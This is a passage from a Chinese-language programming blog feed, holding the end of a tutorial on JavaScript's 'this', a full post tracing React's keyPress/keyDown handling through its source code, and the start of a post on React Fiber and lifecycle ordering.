舉個簡單的例子來幫大家複習一下作用域： 12345678910111213141516171819var a = 10function test()&#123; console.log(a)&#125; const obj = &#123; a: 'ojb', hello: function() &#123; test() // 10 &#125;, hello2: function() &#123; var a = 200 test() // 10 &#125;&#125; test() // 10obj.hello()obj.hello2() 無論我在哪裡，無論我怎麼呼叫test這個 function，他印出來的 a 永遠都會是全域變數的那個 a，因為作用域就是這樣運作，test 在自己的作用域裡面找不到 a 於是往上一層找，而上一層就是 global scope，這跟你在哪裡呼叫 test 一點關係都沒有。test 這個 function 在「定義」的時候就把 scope 給決定好了。 但 this 卻是完全相反，this 的值會根據你怎麼呼叫它而變得不一樣，還記得我們剛講過的 call、apply 跟 bind 嗎？這就是其中一個範例，你可以用不同的方式去呼叫 function，讓 this 的值變得不同。 所以你要很清楚知道這是兩種完全不同的運行模式，一個是靜態（作用域）、一個是動態（this）。要看作用域，就看這個函式在程式碼的「哪裡」；要看 this，就看這個函式「怎麽」被呼叫。 舉一個最常見的範例： 12345678910const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125;&#125; obj.hello() // 1const hey = obj.hellohey() // undefined 明明就是同一個函式，怎麼第一次呼叫時 this.value 是 1，第二次呼叫時就變成 undefined 了？ 記住我剛說的話：「要看 this，就看這個函式『怎麽』被呼叫」。 再繼續往下講之前，先教大家一個最重要的小撇步，是我從this 的值到底是什么？一次说清楚學來的，是一個很方便的方法。 其實我們可以把所有的 function call，都轉成利用call的形式來看，以上面那個例子來說，會是這樣： 123456789101112const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125;&#125; obj.hello() // 1obj.hello.call(obj) // 轉成 callconst hey = obj.hellohey() // undefinedhey.call() // 轉成 call 而規則就是你在呼叫 function 以前是什麼東西，你就把它放到後面去。所以obj.hello()就變成了obj.hello.call(obj)，hey()前面沒有東西，所以就變成了hey.call()。 轉成這樣子的形式之後，還記得 call 的第一個參數就是 this 嗎？所以你就能立刻知道 this 的值是什麼了！ 舉一個更複雜的例子： 123456789101112131415161718const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125;, inner: &#123; value: 2, hello: function() &#123; console.log(this.value) &#125; &#125;&#125; const obj2 = obj.innerconst hello = obj.inner.helloobj.inner.hello()obj2.hello()hello() 你可以不要往下拉，先想一下那三個 function 會各自印出什麼值。 接著我要公布解答了，只要轉成我們上面講的那種形式就好： 123obj.inner.hello() // obj.inner.hello.call(obj.inner) =&gt; 2obj2.hello() // obj2.hello.call(obj2) =&gt; 2hello() // hello.call() =&gt; undefined 特別講一下最後一個 hello 因為沒有傳東西進去，所以是預設綁定，在非嚴格模式底下是 window，所以會 log 出window.value也就是 undefined。 只要你把 function 的呼叫轉成用 call 的這種形式，就很容易看出來 this 的值是什麼。 這也是我前面一直在提的：「要看 this，就看這個函式『怎麽』被呼叫」，而你要看怎麼被呼叫的話，就轉成 call 的形式就行了。 學到這邊，其實你看見九成與 this 相關的題目你都會解了，不信的話我們來試試看（為了可讀性沒有防雷空行，所以請自行拉到程式碼就好，再往下拉就會是解答了）： 123456789function hello() &#123; console.log(this)&#125; var a = &#123; value: 1, hello &#125;var b = &#123; value: 2, hello &#125;hello()a.hello()b.hello.apply(a) 只要按照我們之前說的，用 call 來轉換一下形式就好： 123hello() // hello.call() =&gt; window（瀏覽器非嚴格模式）a.hello() // a.hello.call(a) =&gt; ab.hello.apply(a) =&gt; 直接用 apply，所以就是 a 再來一題比較不一樣的，要看仔細囉（假設在瀏覽器底下跑，非嚴格模式）： 123456789101112var x = 10var obj = &#123; x: 20, fn: function() &#123; var test = function() &#123; console.log(this.x) &#125; test() &#125;&#125; obj.fn() 這題的話如果你搞錯，一定是你忘記了我們最重要的一句話： 要看 this，就看這個函式「怎麽」被呼叫 我們怎麼呼叫 test 的？test()，所以就是test.call()就是預設綁定，this的值就會是 window，所以this.x會是 10，因為在第一行宣告了一個全域變數 x = 10。 寫到這裡，再來幫大家做個回顧，避免大家忘記前面在講什麼： 脫離物件的 this 基本上沒有任何意義 沒有意義的 this 會根據嚴格模式以及環境給一個預設值 嚴格模式底下預設就是 undefined，非嚴格模式在瀏覽器底下預設值是 window 可以用 call、apply 與 bind 改變 this 的值 要看 this，就看這個函式「怎麽」被呼叫 可以把 a.b.c.hello() 看成 a.b.c.hello.call(a.b.c)，以此類推，就能輕鬆找出 this 的值 不合群的箭頭函式 原本有關 this 的部分應該講到上面就要結束了，但 ES6 新增的箭頭函式卻有不太一樣的運作方式。它本身並沒有 this，所以「在宣告它的地方的 this 是什麼，它的 this 就是什麼」，好，我知道這聽起來超難懂，我們來看個範例： 1234567891011121314151617const obj = &#123; x: 1, hello: function()&#123; // 這邊印出來的 this 是什麼，test 的 this 就是什麼 // 就是我說的： // 在宣告它的地方的 this 是什麼，test 的 this 就是什麼 console.log(this) const test = () =&gt; &#123; console.log(this.x) &#125; test() &#125;&#125; obj.hello() // 1const hello = obj.hellohello() // undefined 在第五行我們在 hello 這個 function 裡面宣告了 test 這個箭頭函式，所以 hello 的 this 是什麼，test 的 this 就是什麼。 所以當我們呼叫obj.hello()時，test 的 this 就會是 obj；hello()的時候 test 的 this 就會是全域物件。這規則其實都跟之前一樣，差別只有在於說箭頭函式的 this 不是自己決定的，而是取決於在宣告時那個地方的 this。 如果你想看更複雜的範例，可以參考這篇：鐵人賽：箭頭函式 (Arrow functions) 實際應用：React 你有寫過 React 的話，就會知道裡面其實有些概念今天的教學可以派上用場，舉例來說，我們必須在 constructor 裡面先把一些 method 給 bind 好，你有想過是為什麼嗎？ 先來看看如果沒有 bind 的話會發生什麼事： 12345678class App extends React.Component &#123; onClick() &#123; console.log(this, 'click') &#125; render() &#123; return &lt;button onClick=&#123;this.onClick&#125;&gt;click&lt;/button&gt; &#125;&#125; 最後 log 出來的值會是 undefined，為什麼？這細節就要看 React 的原始碼了，只有 React 知道實際上在 call 我們傳下去的 onClick 函式時是怎麼呼叫的。 所以為什麼要 bind？為了確保我們在onClick裡面拿到的 this 永遠都是這個 instance 本身。 123456789101112131415class App extends React.Component &#123; constructor() &#123; super() // 所以當你把 this.onClick 傳下去時，就已經綁定好了 this // 而這邊的 this 就是這個 component this.onClick = this.onClick.bind(this) &#125; onClick() &#123; console.log(this, 'click') &#125; render() &#123; return &lt;button onClick=&#123;this.onClick&#125;&gt;click&lt;/button&gt; &#125;&#125; 還有另外一種方式是用箭頭函式： 1234567class App extends React.Component &#123; render() &#123; return &lt;button onClick=&#123;() =&gt; &#123; console.log(this) &#125;&#125;&gt;click&lt;/button&gt; &#125;&#125; 為什麼箭頭函式也可以？因為我們前面提過，「在宣告它的地方的 this 是什麼，它的 this 就是什麼」，所以這邊 log 出來的 this 就會是 render 這個 function 的 this，而 render 的 this 就是這個 component。 如果你有點忘記了，可以把文章拉到最上面去，因為最上面我們就已經提過這些了。 總結 關於講解 this 的文章，我至少看過十幾二十篇，比較常見的就是講幾種不同的綁定方法，以及在哪些時候會用哪一種綁定。但這些我在這篇文章裡都沒有提，因為我認為不影響理解（但最好之後能夠自己去補足相關名詞）。 我也曾經迷惘過，曾經被 this 搞得很混亂，前陣子因為教學的緣故不得不把 this 搞懂，而我也確實比以前理解很多了。從我的經驗看來，我認為 this 之所以複雜，原因之一就是：「在物件以外的地方也可以用 this」，所以我才一再強調我認為物件外的 this 是沒意義的。 我對 this 真正開竅的時候是看到了this 的值到底是什么？一次说清楚這篇文章，簡直就是醍醐灌頂，把一般的 function 呼叫換成用 call 的這種形式是個很容易理解也很容易記的方法，而且可以應用在九成的場景底下。 最後，再次強調這篇文章是有疏漏的，開頭的那幾個範例以這篇文章所學到的知識依然無法解釋，那真的是要看 ECMAScript 才會知道；而瀏覽器的 event 的 this 我也沒提，但這部分比較簡單就是了。我只求這篇文章能讓你知道八成的狀況底下 this 的值會是什麼，其他兩成請另尋高明。 這篇融合了我看過的幾篇文章帶給我的想法，也融合了自己融會貫通後的體悟，希望我也能帶給那些卡在 this 許久的初學者們一些新的想法，在看完這篇文章之後能夠以不同的角度去思考 this 的值以及它存在的意義。 寫完這篇以後，關於 JavaScript 那些非常常見但我以前完全沒弄懂的問題就都解釋的差不多了，有興趣的朋友們可以參考其他的主題： 該來理解 JavaScript 的原型鍊了 深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？ 我知道你懂 hoisting，可是你了解到多深？ 所有的函式都是閉包：談 JS 中的作用域與 Closure 參考資料： JavaScript深入之从ECMAScript规范解读this this 的值到底是什么？一次说清楚 What’s THIS in JavaScript ? JS this","link":"/2019/02/23/javascript-what-is-this/"},{"title":"從 React 原始碼看 keyPress 與 keyDown 事件","text":"前言 前陣子有個學生跑來問我一個問題，說他在寫 React 的時候分不清楚 keyPress 與 keyDown 這兩個事件，還有 keyCode 跟 charCode 這兩個東西，有時候拿得到值，有時候卻拿不到，覺得十分困惑。 我原本以為是 React 做了一些處理，所以去看了一下原始碼。後來發現 React 的確有做一些處理，但實際上這個問題跟 React 沒什麼關係，而是 keyPress 跟 keyDown 這兩個原生的 JavaScript 事件本來就有差異。 所以他碰到的問題跟 React 一點關係都沒有，只是對這部分的事件機制不熟而已。 儘管如此，能夠藉由一個實際的問題來參考一下 React 的實作還是件很不錯的事，而且 React 的註解寫得很好。 因此，這篇會先帶大家來看這兩個事件的不同，最後再來看 React 裡面怎麼做一些處理。 keyPress 跟 keyDown 的差異 首先，我們要來看看 keyPress 與 keyDown 這兩個原生事件的差異到底在哪裡，這部分我們直接請出 MDN 來為我們做解釋： The keypress event is fired when a key that produces a character value is pressed down. Examples of keys that produce a character value are alphabetic, numeric, and punctuation keys. Examples of keys that don’t produce a character value are modifier keys such as Alt, Shift, Ctrl, or Meta. 來源：https://developer.mozilla.org/en-US/docs/Web/Events/keypress The keydown event is fired when a key is pressed down. Unlike the keypress event, the keydown event is fired for all keys, regardless of whether they produce a character value. 來源：https://developer.mozilla.org/en-US/docs/Web/Events/keydown 簡單來說呢，keyDown 會在你按下任何按鍵時觸發，但是 keyPress 只會在你按下的按鍵可以產生出一個字元的時候觸發，白話一點就是你按下這按鍵是在打字。 例如說你按a，畫面上會出現一個字元 a，所以 keyDown 跟 keyPress 都會觸發。但如果你按shift，畫面上什麼都不會出現，所以只有 keyDown 會觸發。 w3c 提供了一個很不錯的網頁：Key and Character Codes vs. Event Types ，讓你可以自己實驗看看。 下圖中我輸入 a，兩者都會觸發，接著我按 shift，只會觸發 keyDown，再來按 backspace 把文字刪掉，也只會觸發 keyDown： 所以這兩者的差異相信大家應該可以很清楚的知道了，keyDown 可以當作是「按下按鍵」，keyPress 則當作「輸入東西」時會觸發的事件。 接著我們來談談 keyCode 跟 charCode。 keyCode 與 charCode 的差異 先來談談 charCode 好了，或許你有看過 JavaScript 裡面有個函式是這樣的： 1console.log(String.fromCharCode(65)) // A charCode 其實就是某一個字元所代表的一個號碼，或更精確一點地說，就是它的 Unicode 編碼。 這邊如果不太熟的話可以參考這篇文章：[Guide] 瞭解網頁中看不懂的編碼：Unicode 在 JavaScript 中的使用。 在 JavaScript 裡面也可以用另一個函式拿到字元所對應的編碼： 1console.log(&apos;嗨&apos;.charCodeAt(0)) // 21992 若是你把這 21992 轉成 16 進位，會變成 0x55E8，這個其實就是「嗨」的 Unicode： （來源：https://www.cns11643.gov.tw/wordView.jsp?ID=90944） 那什麼是 keyCode 呢？既然 charCode 代表著是一個 char（字元）的 code，那 keyCode 顯然就是代表一個 key（按鍵）的 code。 每一個「按鍵」也都有一個它自己的代碼，而且有時候會讓你混淆，因為它跟 charCode 可能是一樣的。 舉例來說：「A」這個按鍵的 keyCode 是 65，而「A」這個字元的 charCode 也是 65。這應該是為了某種方便性所以這樣設計，但你要注意到一點： 當我按下「A」這個按鍵的時候，我可能要打的是 a 或是 A，有兩種可能 或是舉另外一個例子，當你要打數字 1 時，如果你是用 Q 上方的那顆按鍵而不是用純數字鍵盤，你要打的字可能是「1」或是「!」或甚至是「ㄅ」，因為它們都是同一顆按鍵。 一顆按鍵對應了不只一個字元，所以單單從 keyCode，你是沒辦法判斷使用者想打什麼字的。 講到這裡，我們可以來想一下這兩個跟 keyPress 與 keyDown 的關聯了。 剛剛說到 keyPress 是你要輸入文字的時候才會觸發，所以這個事件會拿到 charCode，因為你要知道使用者打了什麼字。那為什麼不是 keyCode 呢？因為你從 keyCode 根本不知道他打了什麼字，所以拿 keyCode 也沒用。 keyDown 則是在你按下任何按鍵時都會觸發，這時候一定要拿 keyCode，因為你要知道使用者按了什麼按鍵。若是拿 charCode 的話，你按 shift 或是 ctrl 就沒有值了，因為這不是一個字元，就沒辦法知道使用者按了什麼。 總結一下，當你要偵測使用者輸入文字的時候，就用 keyPress，並且搭配 charCode 來看使用者剛剛輸入了什麼；當你想偵測使用者「按下按鍵」的時候，就用 keyDown，搭配 keyCode 獲得使用者所按下的按鍵。 這就是 keyPress、keyDown 以及 keyCode 跟 charCode 的差別。 順帶一提，在輸入中文的時候 keyPress 不會有值，keyDown 則會回傳一個神秘的代碼 229： key 與 which 在 keyPress 與 keyDown 這兩個 event 裡面，其實還有兩個屬性：key 與 which。 我們先來看一下 which 是什麼： The which read-only property of the KeyboardEvent interface returns the numeric keyCode of the key pressed, or the character code (charCode) for an alphanumeric key pressed. 來源：https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/which 根據我自己的理解，當你在 keyPress 裡面用 which 的時候，拿到的應該就是 charCode；在 keyDown 裡面用的時候就是 keyCode，所以你在寫程式的時候可以統一用 event.which 來拿這個資訊，不必再區分 keyCode 或是 charCode。 不過 MDN 附的參考資料寫的滿模糊的，所以這部分我也不是很確定： which holds a system- and implementation-dependent numerical code signifying the unmodified identifier associated with the key pressed. In most cases, the value is identical to keyCode. 來源：https://www.w3.org/TR/2014/WD-DOM-Level-3-Events-20140925/#widl-KeyboardEvent-which 接著來看一下 key： The KeyboardEvent.key read-only property returns the value of the key pressed by the user while taking into considerations the state of modifier keys such as the shiftKey as well as the keyboard locale/layou 來源：https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key 簡單來說 key 會是一個字串，你剛剛按了什麼按鍵或是打了什麼字，key 就會是什麼。上面 MDN 的網頁下方有附一個簡單的範例讓你來測試 key 的值。 例如說我輸入 A，key 就是 A，按下 Shift，key 就是 Shift。 還有一點要注意的是，這個屬性在 keyPress 或是 keyDown 事件裡面都拿得到。所以儘管是 keyDown 事件，你也能知道使用者剛剛輸入了什麼或是按了什麼按鍵。 但儘管如此，關於「偵測輸入」的事件應該還是用 keyPress 最合適，除非你想要偵測其他不會產生字元的按鍵（Ctrl, Delete, Shift…）才用 keyDown 事件。 在這邊做個中場總結，其實這些 which、keyCode 跟 charCode，在不同瀏覽器上面都可能有不同的表現，所以是跨瀏覽器支援一個很麻煩的部分，從這個方向去找，你可以找到一大堆在講瀏覽器相容性的文章。 但近幾年來舊的瀏覽器漸漸被淘汰，大部分的使用者在用的瀏覽器應該都比較符合標準了，因此相容性並不是本篇文章的重點，所以就沒有多提了。 接下來終於要到可能是最吸引你的部分：React 原始碼。 初探 React 原始碼 React 原始碼這麼大，該從何找起呢？ 這邊推薦一個超級好用的方法：GitHub 的搜尋。通常只要拿你想找的 function 名稱或是相關的關鍵字下去搜尋，就能夠把範圍限縮的很小，只要用肉眼再翻一下資料就能夠找到相對應的原始碼，是方便又好用的一個方法。 這邊我們用keyPress來當關鍵字，出現了 12 筆結果： 用肉眼稍微篩選一下，發現很多都是測試，那些都可以直接跳過。你應該很快就能定位到幾個相關的檔案，像是這兩個： packages/react-dom/src/events/SyntheticKeyboardEvent.js packages/react-dom/src/events/getEventKey.js 沒錯，這兩個就是今天的主角。 我們先來看SyntheticKeyboardEvent.js，如果你對 React 還算熟悉的話，應該知道你在裡面拿到的事件都不是原生的事件，而是 React 會包裝過之後再丟給你，而現在這個SyntheticKeyboardEvent就是經過 React 包裝後的事件，就是你在 onKeyPress 或是 onKeyDown 的時候會拿到的 e。 為了方便起見，我們切成幾個 function，一個一個來看。 1234567891011charCode: function(event) &#123; // `charCode` is the result of a KeyPress event and represents the value of // the actual printable character. // KeyPress is deprecated, but its replacement is not yet final and not // implemented in any major browser. Only KeyPress has charCode. if (event.type === 'keypress') &#123; return getEventCharCode(event); &#125; return 0;&#125; 這邊註解寫得很棒，説 keyPress 已經被 deprecated 了但是替代品還沒準備好。再者，也提到了只有 keyPress 有 charCode。 所以這邊就是判斷 event 的 type 是不是 keypress，是的話就回傳getEventCharCode(event)，否則回傳 0。 接著我們來看一下getEventCharCode在做什麼（小提醒，這個函式在另外一個檔案）： 12345678910111213141516171819202122232425262728293031323334353637383940/** * `charCode` represents the actual \"character code\" and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */function getEventCharCode(nativeEvent) &#123; let charCode; const keyCode = nativeEvent.keyCode; if ('charCode' in nativeEvent) &#123; charCode = nativeEvent.charCode; // FF does not set `charCode` for the Enter-key, check against `keyCode`. if (charCode === 0 &amp;&amp; keyCode === 13) &#123; charCode = 13; &#125; &#125; else &#123; // IE8 does not implement `charCode`, but `keyCode` has the correct value. charCode = keyCode; &#125; // IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux) // report Enter as charCode 10 when ctrl is pressed. if (charCode === 10) &#123; charCode = 13; &#125; // Some non-printable keys are reported in `charCode`/`keyCode`, discard them. // Must not discard the (non-)printable Enter-key. if (charCode &gt;= 32 || charCode === 13) &#123; return charCode; &#125; return 0;&#125; 接著我們一樣分段來看比較方便： 12345678910/** * `charCode` represents the actual \"character code\" and is safe to use with * `String.fromCharCode`. As such, only keys that correspond to printable * characters produce a valid `charCode`, the only exception to this is Enter. * The Tab-key is considered non-printable and does not have a `charCode`, * presumably because it does not produce a tab-character in browsers. * * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;number&#125; Normalized `charCode` property. */ 開頭的註解先跟你說 charCode 代表的就是 character code，所以可以用 String.fromCharCode 來找出搭配的字元。 因此，只有能被印出來（或者是說可以被顯示出來）的字元才有 charCode，而 Enter 是一個例外，因為 Enter 會產生空行。但 Tab 不是，因為你按 Tab 不會產生一個代表 Tab 的字元。 1234567891011121314let charCode;const keyCode = nativeEvent.keyCode; if ('charCode' in nativeEvent) &#123; charCode = nativeEvent.charCode; // FF does not set `charCode` for the Enter-key, check against `keyCode`. if (charCode === 0 &amp;&amp; keyCode === 13) &#123; charCode = 13; &#125;&#125; else &#123; // IE8 does not implement `charCode`, but `keyCode` has the correct value. charCode = keyCode;&#125; 這邊針對瀏覽器的相容性做處理，FireFox 沒有幫 Enter 設定 charCode，所以要額外判斷 keyCode 是不是 13。然後 IE8 沒有實作 charCode，所以用 keyCode 的值來取代。 1234567891011// IE and Edge (on Windows) and Chrome / Safari (on Windows and Linux)// report Enter as charCode 10 when ctrl is pressed.if (charCode === 10) &#123; charCode = 13;&#125; // Some non-printable keys are reported in `charCode`/`keyCode`, discard them.// Must not discard the (non-)printable Enter-key.if (charCode &gt;= 32 || charCode === 13) &#123; return charCode;&#125; 這邊應該算是一個 special case，當使用者按下 Ctrl + Enter 時的 charCode 是 10，React 想把這個也當作按下 Enter 來處理。 另外，有些沒辦法被印出來的字元應該要被拿掉，所以最後做了一個範圍的判斷。 charCode 的處理就是這樣了，仔細看看其實還滿有趣的，針對瀏覽器的相容性跟一些特殊狀況做了處理。 接著我們回到SyntheticKeyboardEvent.js，來看看 keyCode 的處理： 12345678910111213keyCode: function(event) &#123; // `keyCode` is the result of a KeyDown/Up event and represents the value of // physical keyboard key. // The actual meaning of the value depends on the users' keyboard layout // which cannot be detected. Assuming that it is a US keyboard layout // provides a surprisingly accurate mapping for US and European users. // Due to this, it is left to the user to implement at this time. if (event.type === 'keydown' || event.type === 'keyup') &#123; return event.keyCode; &#125; return 0;&#125; 這邊說 keyCode 的值其實是依賴於鍵盤的，意思是說有些鍵盤可能會產生不太一樣的 keyCode，但因為大多數美國跟歐洲的使用者都是 US keyboard，所以這邊就直接把 keyCode 丟回去而不做特殊處理。 其實這一段我沒有看得完全懂，只是大概猜一下意思而已。這邊指的「keyboard layout」可能是像 QWERTY 或是 Dvorak 這種的 layout，按鍵的排列方式完全不同。但如果這樣就會產生不同的 keyCode 的話，是不是代表有些網站可能會有 bug？ 不過大多數人的鍵盤都是同樣的排列，所以好像不用太擔心這個問題。 1234567891011which: function(event) &#123; // `which` is an alias for either `keyCode` or `charCode` depending on the // type of the event. if (event.type === 'keypress') &#123; return getEventCharCode(event); &#125; if (event.type === 'keydown' || event.type === 'keyup') &#123; return event.keyCode; &#125; return 0;&#125; 最後是 which 的部分，如果是 keypress 就把 charCode 傳回去，keydown 或是 keyup 的話就把 keyCode 傳回去。 講到這裡，我們已經看到 React 對於 charCode、keyCode 以及 which 的處理了，charCode 針對特殊情形以及瀏覽器相容性做檢查，keyCode 直接回傳，which 則根據事件不同回傳相對應的值。 最後我們來看一下 key 的處理，這邊放在另外一個檔案叫做getEventKey.js： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495/** * Normalization of deprecated HTML5 `key` values * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */const normalizeKey = &#123; Esc: 'Escape', Spacebar: ' ', Left: 'ArrowLeft', Up: 'ArrowUp', Right: 'ArrowRight', Down: 'ArrowDown', Del: 'Delete', Win: 'OS', Menu: 'ContextMenu', Apps: 'ContextMenu', Scroll: 'ScrollLock', MozPrintableKey: 'Unidentified',&#125;; /** * Translation from legacy `keyCode` to HTML5 `key` * Only special keys supported, all others depend on keyboard layout or browser * @see https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent#Key_names */const translateToKey = &#123; '8': 'Backspace', '9': 'Tab', '12': 'Clear', '13': 'Enter', '16': 'Shift', '17': 'Control', '18': 'Alt', '19': 'Pause', '20': 'CapsLock', '27': 'Escape', '32': ' ', '33': 'PageUp', '34': 'PageDown', '35': 'End', '36': 'Home', '37': 'ArrowLeft', '38': 'ArrowUp', '39': 'ArrowRight', '40': 'ArrowDown', '45': 'Insert', '46': 'Delete', '112': 'F1', '113': 'F2', '114': 'F3', '115': 'F4', '116': 'F5', '117': 'F6', '118': 'F7', '119': 'F8', '120': 'F9', '121': 'F10', '122': 'F11', '123': 'F12', '144': 'NumLock', '145': 'ScrollLock', '224': 'Meta',&#125;; /** * @param &#123;object&#125; nativeEvent Native browser event. * @return &#123;string&#125; Normalized `key` property. */function getEventKey(nativeEvent: KeyboardEvent): string &#123; if (nativeEvent.key) &#123; // Normalize inconsistent values reported by browsers due to // implementations of a working draft specification. // FireFox implements `key` but returns `MozPrintableKey` for all // printable characters (normalized to `Unidentified`), ignore it. const key = normalizeKey[nativeEvent.key] || nativeEvent.key; if (key !== 'Unidentified') &#123; return key; &#125; &#125; // Browser does not implement `key`, polyfill as much of it as we can. if (nativeEvent.type === 'keypress') &#123; const charCode = getEventCharCode(nativeEvent); // The enter-key is technically both printable and non-printable and can // thus be captured by `keypress`, no other non-printable key should. return charCode === 13 ? 'Enter' : String.fromCharCode(charCode); &#125; if (nativeEvent.type === 'keydown' || nativeEvent.type === 'keyup') &#123; // While user keyboard layout determines the actual meaning of each // `keyCode` value, almost all function keys have a universal value. return translateToKey[nativeEvent.keyCode] || 'Unidentified'; &#125; return '';&#125; 這邊一樣是針對瀏覽器的相容性做處理，如果 event 本身就有 key 的話，先做 normalize，把回傳的結果統一成相同的格式。而 FireFox 會把可以印出的字元都設定成 MozPrintableKey，這邊 normalize 成 Unidentified。 如果 normalize 完之後的 key 不是Unidentified的話就回傳，否則再做進一步處理。 而這個進一步處理指的就是 polyfill，如果沒有 key 可以用的話就自己針對 charCode 或是 keyCode 來做處理，回傳相對應的字元或是按鍵名稱。 React 對於這些按鍵相關事件的處理就到這邊差不多了。 原始碼註解寫的很好，可以獲得很多相關資訊，而程式碼很短又不複雜，看起來也很輕鬆，是個很適合入門的切入點。 總結 以前用了這麼多次這些按鍵相關事件，我自已卻從來沒想過這些的區別。要嘛就是隨意寫寫然後出 bug，要嘛就是直接從 stackoverflow 上面複製最佳解答，從來都不知道這些的差異。 這次剛好是因為要幫人解惑才去深入研究，沒想到一個簡單的按鍵事件其實也是水很深，可能要真的踩過雷才會更有感觸。最麻煩的其實是瀏覽器的相容性，各個瀏覽器可能都有自己不同的實作，要怎麼處理這些不同的情況才是麻煩的地方。 提到 React 原始碼，大家想到的可能都是 render 的相關機制或是 component 的處理，那些原始碼十分複雜，而且必須要對整體的架構有一定的理解才比較好看懂。 這篇選擇從 keyboard 的事件出發，來看 React 針對這部份的處理。相信程式碼大家都看得懂，也不會覺得特別難，就是想告訴大家若是你想研究其他人的原始碼，有時候不一定要整個專案都看懂，可以先從一些小地方開始下手。 從 utils 這種簡單的 function 開始也行，不一定要從最難的開始挑戰，你都能學到很多東西。","link":"/2019/03/24/react-keypress-keydown/"},{"title":"淺談 React Fiber 及其對 lifecycles 造成的影響","text":"前言 雖然說從以前就一直聽到 React 要把內部的 reconciler 換成一個叫做 Fiber 的東西，但從沒仔細研究過，也不知道這樣子的改變會對上層造成什麼影響。 真正開始比較深入理解，是在某一次使用 Redux Form 時踩到一個相關的 bug，才知道 React 自從正式改用 Fiber 之後，其實對上層也有一些改變。 這篇的標題「淺談」不是騙你的，這篇真的很淺，我不會談到 Fiber 底層的運作（因為我也還沒認真研究過），只會用白話文跟你說 Fiber 大概是怎樣，是為了解決什麼樣子的問題而誕生。 萬里之行，始於 Bug 每一次能踩到 Bug 的機會，我都會好好把握。 為什麼？因為這是一次強迫你學習的機會。Bug 解不掉，你就沒辦法繼續下去，所以為了要解決 Bug，你必須去探究原因，必須知道這個問題為什麼產生，以及應該要怎麼解決。 當然，你也可以直接從 Stack Overflow 找答案然後複製貼上，覆蓋這張牌結束這回合。可是工作久了你會發現，不是所有問題都可以從那上面找到解答。 舉例來說，我一年前寫的我遇過的最難的 Cookie 問題對我來說就是一個很好的學習機會。 好，那這次我又是遇到什麼 Bug 呢？ 我們公司的產品有用到redux-form，而問題是這樣的，我有兩個頁面，都用了同一個 component，叫做FormBlock好了。 我先去 A 頁面，再去 B 頁面，再回來 A 頁面，我的 redux-form 的 validation 就失效了，在表單 submit 的時候並不會執行 validation。 那時候搜到了幾個相關的 issue，但還是想自己查個清楚，就跑去找了 redux-form 的原始碼，研究了幾個小時終於找到出問題的地方。 在 redux-form 執行 validation 的時候，會先檢查 fields 是不是有被註冊過，如果沒被註冊的話，就直接回傳true，不會進行任何驗證，我自己加了幾個 console.log 之後，發現問題就是出在這邊，field 沒有被註冊到。 接著就來找一下是在哪邊註冊的，發現在componentWillMount的時候，會 dispatch 一個 action 來註冊所有的表單欄位（REGISTER_FIELD）。 然後在componentWillUnmount的時候，redux-form 會 dispatch 一個 action 叫做DESTROY（相關程式碼），把所有註冊的 field 給清掉。 到目前為止，一切看似都很合理。我在離開 B 頁面的時候，觸發FormBlock的componentWillUnmount，取消註冊所有的 field，在進入 A 頁面時，觸發FormBlock的componentWillMount，把所有的 field 重新註冊回來。 可是如果你打開 redux-devtool，會發現順序跟你想像中不太一樣： 咦？怎麼會先註冊再刪除？而且因為刪除了，所以驗證就失效了，不會執行任何驗證的邏輯。 再仔細找了一下相關的資料，看到這篇 Browser back button not working with react-router@4.0.0-beta.7 and react@16-alpha.4 Issue 以及 Redux 以及 React 的開發者 gaearon 在下面的回答： In React 15, if A is replaced by B, we unmount A, and then create and mount B: A.componentWillUnmount B.constructor B.componentWillMount B.componentDidMount In Fiber, we create B first, and only later unmount A and mount B: B.constructor B.componentWillMount A.componentWillUnmount B.componentDidMount 在 React 16 以後，由於這樣子的順序改變，導致了上面 redux-form 的 lifecycle 執行順序跟預期中不符，也間接導致了我開頭所說的那個 Bug。 到了這邊，問題產生的原因一路從 redux-form 本身追到了 React，又更細節的追到了 Fiber，看來，沒辦法再繼續逃避 Fiber 了。 先一併奉上跟 redux-form 以及執行順序相關的其他參考資料，再讓我們好好看看 Fiber。 Re-mounting a Field component erases the field-level validation function Ordering of componentWillMount/Unmount in React 16 Asynchronous ComponentWillUnmount in React 16 Fiber 到底是什麼？ 要瞭解一個新的東西，最快的方式就是回答以下問題： 它是拿來解決什麼問題的？ 解決方法是什麼？ 只要能了解這兩個問題，就能對這個新的東西有初步的概念，儘管你還是不知道實作細節，但至少你知道它帶來的影響及改變是什麼。 我們先來看一下一直存在於 React 的一個問題。 假設你現在有一個超級多功能的 App，有著超級多的 Component，然後你改變了最上層的 Component（假設它叫&lt;App /&gt;） 的 state。 因為 state 變了，所以就會來執行這個&lt;App /&gt;的 render function，然後執行App底下的 component 的 render function，就這樣一直往下執行下去，直到碰到最底層為止。 你如果去看 call stack，就會發現這個 call stack 超大一個： （圖片來源：React Fiber現状確認） 這樣會造成什麼問題呢？因為你的 call stack 太深而且東西太多，再加上這個過程又是不能被中斷的，會導致 main thread 被 block 住，在這時間之內你做任何事情，瀏覽器都不會有反應。 簡單來說呢，就是因為要做的事太多，所以 main thread 就會 block 住了，這就是 React 在效能上會碰到的一個問題。 到這邊，我們已經回答第一個問題了，Fiber 就是為了解決這個問題而產生的解法。接著我們來回答第二個問題：解決方法是什麼？ 既然問題的成因是：「要做的事情太多又不能中斷」，那我們只要發明一個「可以中斷」的機制就好啦！不要一次全部更新，而是增量更新（incremental rendering），就可以解決這個問題了！ 比起原本的一次性更新，假如我們能夠把要更新的工作切成一個個小的工作，每次只執行一個小工作，那這樣 main thread 就不會被 block 